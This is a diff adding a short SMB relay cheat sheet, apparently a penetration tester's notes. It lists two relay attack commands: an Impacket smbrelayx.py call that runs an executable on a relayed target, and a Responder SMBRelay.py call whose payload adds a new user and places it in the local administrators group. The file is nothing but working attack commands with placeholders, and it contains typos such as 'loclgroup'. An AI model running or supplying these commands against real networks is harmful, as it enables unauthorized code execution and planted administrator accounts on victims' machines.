@@ -1,0 +1,7 @@
+SMB Relay Cheat Sheet
+#Impackacet
+python smbrelayx.py -h [RELAY_TARGET_IP] -e [executable]
+
+#Responder  #as of 2/14/16 this was having library issues
+#set SMB = Off in Responder.conf
+python /opt/Responder/tools/SMBRelay.py -i [RELAY_TARGET_IP] -c 'net user [NEW_USER_NAME] [NEW_PASSWORD] /add && net loclgroup administrators [NEW_USER_NAME] /add' -t [IP] -u [SPACE_SEPARATED USER_LIST] 
